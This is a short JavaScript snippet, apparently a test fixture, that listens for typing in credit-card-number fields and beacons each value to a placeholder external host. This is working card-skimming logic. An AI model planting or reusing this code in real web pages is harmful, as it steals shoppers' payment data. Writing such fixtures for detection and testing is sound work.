function inspectBeacon(document, navigator) {
  document.addEventListener('input', ev => {
    if (ev.target.matches('input[autocomplete="cc-number"]')) {
      navigator.sendBeacon('https://example.invalid/fixture', JSON.stringify({value: ev.target.value}));
    }
  });
}
